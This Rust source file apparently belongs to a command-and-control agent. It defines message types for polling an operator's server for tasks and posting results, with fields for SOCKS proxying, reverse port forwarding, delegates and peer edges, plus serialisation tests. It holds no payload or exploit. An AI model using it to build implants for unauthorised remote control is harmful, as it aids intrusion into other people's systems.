//! Tasking message types — polling for tasks and posting results.

use alloc::{
    string::{String, ToString},
    vec::Vec,
};
use serde::{Deserialize, Serialize};

use super::{
    ACTION_GET_TASKING, ACTION_POST_RESPONSE,
    peer::{
        AlertMessage, DelegateMessage, EdgeMessage, InteractiveMessage, ReversePortForwardMessage,
        SocksMessage,
    },
    task::{ResponseReceipt, TaskMessage, TaskResponse},
};

fn default_tasking_size() -> i32 {
    1
}

fn default_get_delegate_tasks() -> bool {
    true
}

#[derive(Debug, Clone, Serialize, Deserialize, Default, PartialEq)]
pub struct AgentExtras {
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub delegates: Vec<DelegateMessage>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub socks: Vec<SocksMessage>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub rpfwd: Vec<ReversePortForwardMessage>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub interactive: Vec<InteractiveMessage>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub alerts: Vec<AlertMessage>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub edges: Vec<EdgeMessage>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default, PartialEq)]
pub struct AgentMessageExtras {
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub responses: Vec<TaskResponse>,
    #[serde(flatten)]
    pub shared: AgentExtras,
}

pub type AgentResponseExtras = AgentExtras;

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct ReqGetTasking {
    pub action: String,
    #[serde(default = "default_tasking_size")]
    pub tasking_size: i32,
    #[serde(default = "default_get_delegate_tasks")]
    pub get_delegate_tasks: bool,
    #[serde(flatten)]
    pub extras: AgentMessageExtras,
}

impl ReqGetTasking {
    pub fn new(tasking_size: i32) -> Self {
        Self {
            action: ACTION_GET_TASKING.to_string(),
            tasking_size,
            get_delegate_tasks: true,
            extras: AgentMessageExtras::default(),
        }
    }

    pub fn with_delegate_tasks(tasking_size: i32, get_delegate_tasks: bool) -> Self {
        Self {
            action: ACTION_GET_TASKING.to_string(),
            tasking_size,
            get_delegate_tasks,
            extras: AgentMessageExtras::default(),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct RespGetTasking {
    pub action: String,
    #[serde(default)]
    pub tasks: Vec<TaskMessage>,
    #[serde(flatten)]
    pub extras: AgentResponseExtras,
}

impl RespGetTasking {
    pub fn new(tasks: Vec<TaskMessage>) -> Self {
        Self {
            action: ACTION_GET_TASKING.to_string(),
            tasks,
            extras: AgentResponseExtras::default(),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct ReqPostResponse {
    pub action: String,
    #[serde(flatten)]
    pub extras: AgentMessageExtras,
}

impl ReqPostResponse {
    pub fn new(responses: Vec<TaskResponse>) -> Self {
        Self {
            action: ACTION_POST_RESPONSE.to_string(),
            extras: AgentMessageExtras {
                responses,
                shared: AgentExtras::default(),
            },
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct RespPostResponse {
    pub action: String,
    #[serde(default)]
    pub responses: Vec<ResponseReceipt>,
    #[serde(flatten)]
    pub extras: AgentResponseExtras,
}

impl RespPostResponse {
    pub fn new(responses: Vec<ResponseReceipt>) -> Self {
        Self {
            action: ACTION_POST_RESPONSE.to_string(),
            responses,
            extras: AgentResponseExtras::default(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::protocol::task::TaskResponse;
    use alloc::vec;

    #[test]
    fn get_tasking_defaults_are_correct() {
        let req = ReqGetTasking::new(9);
        let req_without = ReqGetTasking::with_delegate_tasks(3, false);

        assert_eq!(req.action, ACTION_GET_TASKING);
        assert_eq!(req.tasking_size, 9);
        assert!(req.get_delegate_tasks);
        assert!(!req_without.get_delegate_tasks);
    }

    #[test]
    fn post_response_wraps_responses() {
        let task_id = uuid::Uuid::nil();
        let req = ReqPostResponse::new(vec![TaskResponse::completed(task_id, "ok")]);

        assert_eq!(req.action, ACTION_POST_RESPONSE);
        assert_eq!(req.extras.responses.len(), 1);
        assert_eq!(req.extras.responses[0].task_id, task_id);
        assert_eq!(
            req.extras.responses[0].status.as_deref(),
            Some("completed")
        );
    }

    #[test]
    fn tasking_models_roundtrip() {
        let uuid = uuid::Uuid::nil();
        let next_uuid = uuid::Uuid::from_u128(1);

        let extras = AgentMessageExtras::default();
        assert_eq!(
            serde_json::from_str::<AgentMessageExtras>(&serde_json::to_string(&extras).unwrap())
                .unwrap(),
            extras
        );

        let resp_extras = AgentResponseExtras::default();
        assert_eq!(
            serde_json::from_str::<AgentResponseExtras>(
                &serde_json::to_string(&resp_extras).unwrap()
            )
            .unwrap(),
            resp_extras
        );

        let resp_get = RespGetTasking {
            action: ACTION_GET_TASKING.to_string(),
            tasks: vec![TaskMessage {
                command: "ls".to_string(),
                parameters: "-la".to_string(),
                timestamp: 1.0,
                id: uuid,
            }],
            extras: AgentResponseExtras::default(),
        };
        assert_eq!(
            serde_json::from_str::<RespGetTasking>(&serde_json::to_string(&resp_get).unwrap())
                .unwrap(),
            resp_get
        );

        let resp_post = RespPostResponse {
            action: ACTION_POST_RESPONSE.to_string(),
            responses: vec![ResponseReceipt {
                task_id: uuid,
                status: "sent".to_string(),
                file_id: Some(next_uuid),
                error: None,
            }],
            extras: AgentResponseExtras::default(),
        };
        assert_eq!(
            serde_json::from_str::<RespPostResponse>(
                &serde_json::to_string(&resp_post).unwrap()
            )
            .unwrap(),
            resp_post
        );

        let socks = SocksMessage {
            server_id: 42,
            exit: true,
            data: None,
        };
        assert_eq!(
            serde_json::from_str::<SocksMessage>(&serde_json::to_string(&socks).unwrap()).unwrap(),
            socks
        );

        let rpfwd = ReversePortForwardMessage {
            server_id: 7,
            exit: false,
            data: Some("payload".to_string()),
        };
        assert_eq!(
            serde_json::from_str::<ReversePortForwardMessage>(
                &serde_json::to_string(&rpfwd).unwrap()
            )
            .unwrap(),
            rpfwd
        );
    }
}
